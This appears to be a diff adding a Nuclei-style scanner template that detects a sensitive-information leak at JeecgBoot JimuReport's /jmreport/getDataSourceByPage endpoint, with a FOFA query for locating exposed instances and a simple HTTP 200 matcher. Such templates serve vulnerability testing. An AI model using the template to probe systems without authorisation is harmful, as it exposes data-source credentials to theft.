@@ -1,0 +1,19 @@
+id: poc-ih355qka56lq16c6
+info:
+  name: JeecgBoot 积木报表 getDataSourceByPage 敏感信息泄露
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ih355qka56lq16c6'
+  tags: rce,info-leak,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ih355qka56lq16c6
+    fofa: app="JeecgBoot-企业级低代码平台"
+http:
+- raw:
+  - GET /jmreport/getDataSourceByPage HTTP/1.1
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
